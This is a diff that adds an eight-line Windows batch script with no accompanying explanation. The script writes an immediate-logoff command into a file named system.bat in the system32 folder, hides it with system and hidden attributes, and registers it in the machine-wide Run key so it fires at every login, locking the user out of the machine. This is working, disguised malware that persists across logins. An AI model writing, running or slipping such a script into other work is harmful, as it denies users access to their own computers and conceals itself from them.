@@ -1,0 +1,8 @@
+@echo off
+echo shutdown -l -t 0 >C:\WINDOWS\system32\system.bat
+attrib C:\WINDOWS\system32\system.bat +s +h
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system /t REG_SZ /d C:\WINDOWS\system32\system.bat /f 
+
+
+
+
